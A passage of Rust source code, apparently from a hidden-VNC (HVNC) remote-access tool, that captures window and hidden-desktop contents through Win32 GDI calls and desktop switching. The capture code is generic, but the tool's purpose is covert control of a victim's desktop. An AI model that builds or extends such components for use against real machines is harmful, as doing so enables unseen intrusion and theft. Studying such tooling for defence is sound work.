    let mem_dc = unsafe { CreateCompatibleDC(window_dc) };
    if mem_dc.is_null() {
        unsafe { ReleaseDC(context.window_handle, window_dc) };
        return Err(HvncError::windows_api("Failed to create compatible DC"));
    }
    
    let bitmap = unsafe { CreateCompatibleBitmap(window_dc, width as i32, height as i32) };
    if bitmap.is_null() {
        unsafe { 
            DeleteDC(mem_dc);
            ReleaseDC(context.window_handle, window_dc);
        }
        return Err(HvncError::windows_api("Failed to create compatible bitmap"));
    }
    
    let old_bitmap = unsafe { SelectObject(mem_dc, bitmap as *mut _) };
    
    let blt_result = unsafe {
        BitBlt(
            mem_dc,
            0,
            0,
            width as i32,
            height as i32,
            window_dc,
            0,
            0,
            SRCCOPY,
        )
    };
    
    if blt_result == 0 {
        let error_code = unsafe { GetLastError() };
        unsafe {
            SelectObject(mem_dc, old_bitmap);
            DeleteObject(bitmap as *mut _);
            DeleteDC(mem_dc);
            ReleaseDC(context.window_handle, window_dc);
        }
        return Err(HvncError::windows_api(&format!("BitBlt failed (code: {})", error_code)));
    }
    
    let rgb_data = bitmap_to_rgb_buffer(bitmap, width, height)?;
    
    unsafe {
        SelectObject(mem_dc, old_bitmap);
        DeleteObject(bitmap as *mut _);
        DeleteDC(mem_dc);
        ReleaseDC(context.window_handle, window_dc);
    }
    
    info!("Direct window capture successful: {}x{}", width, height);
    
    Ok(Frame {
        width,
        height,
        data: rgb_data,
    })
}

/// Method 4: Desktop context capture with proper switching
fn capture_with_desktop_context(context: &mut AdvancedCaptureContext) -> Result<Frame> {
    info!("🖥️ Using Desktop Context capture method");
    
    // This method requires desktop switching
    let desktop = context.target_desktop.ok_or_else(|| {
        HvncError::windows_api("Desktop context capture requires target desktop")
    })?;
    
    switch_to_desktop(context, desktop)?;
    
    // After desktop switch, try to capture using desktop DC
    let desktop_dc = unsafe { CreateDCA(b"DISPLAY\0".as_ptr() as *const i8, ptr::null(), ptr::null(), ptr::null()) };
    if desktop_dc.is_null() {
        return Err(HvncError::windows_api("Failed to create desktop DC"));
    }
    
    let width = (context.window_rect.right - context.window_rect.left) as u32;
    let height = (context.window_rect.bottom - context.window_rect.top) as u32;
    
    let mem_dc = unsafe { CreateCompatibleDC(desktop_dc) };
    if mem_dc.is_null() {
        unsafe { DeleteDC(desktop_dc) };
        return Err(HvncError::windows_api("Failed to create compatible DC"));
    }
    
    let bitmap = unsafe { CreateCompatibleBitmap(desktop_dc, width as i32, height as i32) };
    if bitmap.is_null() {
        unsafe { 
            DeleteDC(mem_dc);
            DeleteDC(desktop_dc);
        }
        return Err(HvncError::windows_api("Failed to create compatible bitmap"));
    }
    
    let old_bitmap = unsafe { SelectObject(mem_dc, bitmap as *mut _) };
    
    let blt_result = unsafe {
        BitBlt(
            mem_dc,
            0,
            0,
            width as i32,
            height as i32,
            desktop_dc,
            context.window_rect.left,
            context.window_rect.top,
            SRCCOPY,
        )
    };
    
    if blt_result == 0 {
        let error_code = unsafe { GetLastError() };
        unsafe {
            SelectObject(mem_dc, old_bitmap);
            DeleteObject(bitmap as *mut _);
            DeleteDC(mem_dc);
            DeleteDC(desktop_dc);
        }
        return Err(HvncError::windows_api(&format!("Desktop BitBlt failed (code: {})", error_code)));
    }
    
    let rgb_data = bitmap_to_rgb_buffer(bitmap, width, height)?;
    
    unsafe {
        SelectObject(mem_dc, old_bitmap);
        DeleteObject(bitmap as *mut _);
        DeleteDC(mem_dc);
        DeleteDC(desktop_dc);
    }
    
    info!("Desktop context capture successful: {}x{}", width, height);
    
    Ok(Frame {
        width,
        height,
        data: rgb_data,
    })
}

/// Method 5: Layered window capture (for special cases)
fn capture_with_layered_window(context: &mut AdvancedCaptureContext) -> Result<Frame> {
    info!("🔍 Using Layered Window capture method");
    
    // This is a fallback method that tries client area only
    let mut client_rect = RECT { left: 0, top: 0, right: 0, bottom: 0 };
    if unsafe { GetClientRect(context.window_handle, &mut client_rect) } == 0 {
        return Err(HvncError::windows_api("Failed to get client rectangle"));
    }
    
    let width = (client_rect.right - client_rect.left) as u32;
    let height = (client_rect.bottom - client_rect.top) as u32;
    
    if width == 0 || height == 0 {
        return Err(HvncError::windows_api("Invalid client dimensions"));
    }
    
    let window_dc = unsafe { GetDC(context.window_handle) };
    if window_dc.is_null() {
        return Err(HvncError::windows_api("Failed to get client DC"));
    }
    
    let mem_dc = unsafe { CreateCompatibleDC(window_dc) };
    if mem_dc.is_null() {
        unsafe { ReleaseDC(context.window_handle, window_dc) };
        return Err(HvncError::windows_api("Failed to create compatible DC"));
    }
    
    let bitmap = unsafe { CreateCompatibleBitmap(window_dc, width as i32, height as i32) };
    if bitmap.is_null() {
        unsafe { 
            DeleteDC(mem_dc);
            ReleaseDC(context.window_handle, window_dc);
        }
        return Err(HvncError::windows_api("Failed to create compatible bitmap"));
    }
    
    let old_bitmap = unsafe { SelectObject(mem_dc, bitmap as *mut _) };
    
    let blt_result = unsafe {
        BitBlt(
            mem_dc,
            0,
            0,
            width as i32,
            height as i32,
            window_dc,
            0,
            0,
            SRCCOPY,
        )
    };
    
    if blt_result == 0 {
        let error_code = unsafe { GetLastError() };
        unsafe {
            SelectObject(mem_dc, old_bitmap);
            DeleteObject(bitmap as *mut _);
            DeleteDC(mem_dc);
            ReleaseDC(context.window_handle, window_dc);
        }
        return Err(HvncError::windows_api(&format!("Client area BitBlt failed (code: {})", error_code)));
    }
    
    let rgb_data = bitmap_to_rgb_buffer(bitmap, width, height)?;
    
    unsafe {
        SelectObject(mem_dc, old_bitmap);
        DeleteObject(bitmap as *mut _);
        DeleteDC(mem_dc);
        ReleaseDC(context.window_handle, window_dc);
    }
    
    info!("Layered window capture successful: {}x{}", width, height);
    
    Ok(Frame {
        width,
        height,
        data: rgb_data,
    })
}

/// Switch to target desktop
fn switch_to_desktop(context: &mut AdvancedCaptureContext, desktop: DesktopHandle) -> Result<()> {
    if context.desktop_switched {
        return Ok(()); // Already switched
    }
    
    let original_desktop = unsafe { GetThreadDesktop(GetCurrentThreadId()) };
    if original_desktop.is_null() {
        return Err(HvncError::windows_api("Failed to get current thread desktop"));
    }
    
    context.original_desktop = Some(original_desktop);
    
    let switch_result = unsafe { SetThreadDesktop(desktop) };
    if switch_result == 0 {
        let error_code = unsafe { GetLastError() };
        return Err(HvncError::windows_api(&format!("Failed to switch to target desktop (code: {})", error_code)));
    }
    
    context.desktop_switched = true;
    info!("Successfully switched to target desktop");
    Ok(())
}

/// Convert Windows bitmap to RGB buffer
fn bitmap_to_rgb_buffer(bitmap: HBITMAP, width: u32, height: u32) -> Result<Vec<u8>> {
    let mut bmi = BITMAPINFO {
        bmiHeader: BITMAPINFOHEADER {
            biSize: mem::size_of::<BITMAPINFOHEADER>() as u32,
            biWidth: width as i32,
            biHeight: -(height as i32), // Negative for top-down bitmap
            biPlanes: 1,
            biBitCount: 32, // 32-bit RGBA
            biCompression: BI_RGB,
            biSizeImage: 0,
            biXPelsPerMeter: 0,
            biYPelsPerMeter: 0,
            biClrUsed: 0,
            biClrImportant: 0,
        },
        bmiColors: [winapi::um::wingdi::RGBQUAD { rgbBlue: 0, rgbGreen: 0, rgbRed: 0, rgbReserved: 0 }; 1],
    };
    
    let buffer_size = (width * height * 4) as usize; // 4 bytes per pixel (RGBA)
    let mut buffer = vec![0u8; buffer_size];
    
    let dc = unsafe { GetDC(ptr::null_mut()) };
    if dc.is_null() {
        return Err(HvncError::windows_api("Failed to get screen DC for bitmap conversion"));
    }
    
    let result = unsafe {
        GetDIBits(
            dc,
            bitmap,
            0,
            height,
            buffer.as_mut_ptr() as *mut _,
            &mut bmi,
            DIB_RGB_COLORS,
        )
    };
    
    unsafe { ReleaseDC(ptr::null_mut(), dc) };
    
    if result == 0 {
        return Err(HvncError::windows_api("Failed to get bitmap bits"));
    }
    
    // Convert BGRA to RGB
    let mut rgb_buffer = Vec::with_capacity((width * height * 3) as usize);
    for i in (0..buffer.len()).step_by(4) {
        if i + 3 < buffer.len() {
            rgb_buffer.push(buffer[i + 2]); // Red
            rgb_buffer.push(buffer[i + 1]); // Green
            rgb_buffer.push(buffer[i]);     // Blue
        }
    }
    
    Ok(rgb_buffer)
}

/// Clean up partial state between capture attempts
fn cleanup_partial_state(_context: &mut AdvancedCaptureContext) {
    // Reset desktop switch state but don't restore yet (in case next method needs it)
    // Full cleanup will happen at the end
}

/// Clean up capture context
fn cleanup_capture_context(context: &mut AdvancedCaptureContext) {
    if context.desktop_switched {
        if let Some(original_desktop) = context.original_desktop {
            let restore_result = unsafe { SetThreadDesktop(original_desktop) };
            if restore_result == 0 {
                warn!("Warning: Failed to restore original desktop");
            } else {
                info!("Successfully restored original desktop");
            }
        }
        context.desktop_switched = false;
    }
}